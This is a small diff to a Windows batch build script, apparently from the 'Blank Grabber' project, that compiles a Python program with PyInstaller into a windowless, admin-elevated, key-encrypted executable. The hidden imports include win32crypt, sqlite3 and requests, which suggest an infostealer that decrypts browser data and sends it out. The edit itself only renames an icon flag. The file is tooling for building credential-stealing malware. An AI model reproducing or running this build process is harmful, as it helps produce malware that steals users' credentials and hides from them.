@@ -8,7 +8,7 @@ goto convert
 pyinstaller --onefile --noconsole --noconfirm --uac-admin main-o.py --name "Blank Grabber" --icon icon.ico --clean --hidden-import=glob --hidden-import=requests --hidden-import=sqlite3 --hidden-import=win32crypt --hidden-import=pyaes --add-data "structc.pyd;." --key %random%%random%%random%5
 goto done
 :noicon
-pyinstaller --onefile --noconsole --noconfirm --uac-admin main-o.py --name "Blank Grabber" --icon NONE --clean --hidden-import=glob --hidden-import=requests --hidden-import=sqlite3 --hidden-import=win32crypt --hidden-import=pyaes --add-data "structc.pyd;." --key %random%%random%%random%5
+pyinstaller --onefile --noconsole --noconfirm --uac-admin main-o.py --name "Blank Grabber" --i NONE --clean --hidden-import=glob --hidden-import=requests --hidden-import=sqlite3 --hidden-import=win32crypt --hidden-import=pyaes --add-data "structc.pyd;." --key %random%%random%%random%5
 goto done
 :convert
 if exist icon.ico goto icon
